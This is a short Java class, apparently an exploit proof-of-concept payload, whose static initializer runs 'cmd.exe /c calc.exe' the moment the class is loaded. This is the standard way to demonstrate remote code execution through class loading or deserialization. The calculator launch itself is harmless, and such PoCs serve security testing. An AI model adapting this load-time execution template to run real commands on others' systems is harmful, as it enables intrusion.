public class LifExp {

static {
try {
String[] cmd = {"cmd.exe", "/c", "calc.exe"};
java.lang.Runtime.getRuntime().exec(cmd).waitFor();
} catch ( Exception e ) {
e.printStackTrace();
}
}
}
